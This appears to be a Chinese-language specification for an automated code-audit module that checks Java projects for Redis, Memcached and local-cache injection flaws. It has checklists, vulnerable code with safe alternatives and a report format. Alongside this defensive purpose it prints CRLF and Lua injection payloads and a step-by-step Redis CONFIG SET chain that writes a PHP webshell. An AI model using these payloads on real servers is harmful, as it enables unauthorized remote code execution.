# 缓存注入审计分支

## 触发条件

- 标签: `REDIS_DESER`, `REDIS_COMMAND`, `MEMCACHED`, `CACHE_POISON`, `EHCACHE`, `CAFFEINE`
- 优先级: 2（中高危）

## 审计检查点

### Redis 反序列化

| 检查项 | 说明 |
|--------|------|
| RD1 | Redis 存储的值是否使用 Java Serialization？ |
| RD2 | 是否存在 `JdkSerializationRedisSerializer`（默认）？ |
| RD3 | 是否配置了序列化白名单？ |
| RD4 | 是否存在 Redis Gadget 链（Spring Data Redis）？ |

### Redis 命令注入

| 检查项 | 说明 |
|--------|------|
| RC1 | Redis Key/Value 是否拼接用户输入？ |
| RC2 | 是否存在 CRLF 注入（`\r\n`）？ |
| RC3 | 是否存在 `EVAL` Lua 脚本注入？ |
| RC4 | 是否存在 `KEYS` 命令导致 DoS？ |

### Redis 配置攻击

| 检查项 | 说明 |
|--------|------|
| RF1 | 是否存在 `CONFIG SET dir/dbfilename` 写入 Webshell？ |
| RF2 | 是否存在 `SLAVEOF` 主从复制 RCE？ |
| RF3 | 是否存在 `MODULE LOAD` 加载恶意模块？ |
| RF4 | Redis 是否启用 `requirepass`？ |
| RF5 | Redis 是否绑定内网（非 0.0.0.0）？ |
| RF6 | 是否存在 `DEBUG` 命令暴露？ |

### Memcached

| 检查项 | 说明 |
|--------|------|
| MC1 | 是否存在 Memcached 反序列化（Java Client）？ |
| MC2 | 是否存在 Key 注入（CRLF）？ |
| MC3 | 是否存在缓存投毒（Cache Poisoning）？ |
| MC4 | 是否存在 UDP 反射放大攻击风险？ |
| MC5 | 是否启用 SASL 认证？ |

### 本地缓存（Ehcache/Caffeine）

| 检查项 | 说明 |
|--------|------|
| LC1 | 缓存 Key 是否可预测（导致缓存穿透）？ |
| LC2 | 是否存在缓存投毒（恶意数据写入缓存）？ |
| LC3 | 缓存过期策略是否合理？ |
| LC4 | 是否存在缓存击穿（热点 Key 失效）？ |

## 危险模式

```java
// Redis 反序列化 (Spring Data Redis 默认)
@Bean
public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory factory) {
    RedisTemplate<String, Object> template = new RedisTemplate<>();
    template.setConnectionFactory(factory);
    // 默认使用 JdkSerializationRedisSerializer → 反序列化漏洞
    return template;
}

// 安全替代
template.setValueSerializer(new GenericJackson2JsonRedisSerializer());

// Redis 命令注入
String key = "user:" + request.getParameter("userId");
jedis.get(key);
// 攻击者输入: userId=1\r\nCONFIG SET dir /var/www/html

// Redis Lua 脚本注入
String script = "return redis.call('get', '" + userInput + "')";
jedis.eval(script);
// 攻击者输入: '); redis.call('CONFIG', 'SET', 'dir', '/tmp'); --

// Memcached Key 注入
String key = "session:" + sessionId;
memcachedClient.get(key);
// 攻击者输入: sessionId=abc\r\nset hacked 0 0 5\r\nhello
```

## Redis 攻击链

```
1. 未授权访问 Redis (无 requirepass)
2. CONFIG SET dir /var/www/html
3. CONFIG SET dbfilename shell.php
4. SET payload "<?php system($_GET['cmd']); ?>"
5. SAVE
→ Webshell 写入成功
```

## 审计流程

```
1. 识别项目使用的缓存类型
2. 检查序列化配置（Redis）
3. 检查认证配置
4. 检查 Key/Value 构建方式
5. 检查是否存在危险命令暴露
6. 使用 LSP 追踪缓存操作链
7. 生成漏洞报告或标记为安全
```

## 回溯请求触发条件

- 缓存 Key 来自用户输入 → 追踪 Key 构建逻辑
- 缓存 Value 使用序列化 → 请求展开序列化配置
- Redis 配置在外部文件 → 请求读取配置

## 输出格式

```json
{
  "branch": "cache-inject",
  "cache_type": "Redis",
  "findings": [
    {
      "type": "Redis 反序列化 RCE",
      "severity": "CRITICAL",
      "sink": "RedisTemplate.opsForValue().get()",
      "source": "Redis 存储数据",
      "evidence": "使用 JdkSerializationRedisSerializer（默认），未配置白名单",
      "sanitization": "无序列化过滤",
      "poc": "向 Redis 写入恶意序列化数据，应用读取时触发反序列化",
      "gadget_chains": ["CommonsCollections6", "SpringDataRedis"]
    },
    {
      "type": "Redis 未授权访问",
      "severity": "HIGH",
      "sink": "Redis 端口 6379",
      "source": "网络",
      "evidence": "未配置 requirepass，绑定 0.0.0.0",
      "sanitization": "无认证",
      "poc": "redis-cli -h target -p 6379 → CONFIG SET dir /var/www/html"
    }
  ]
}
```
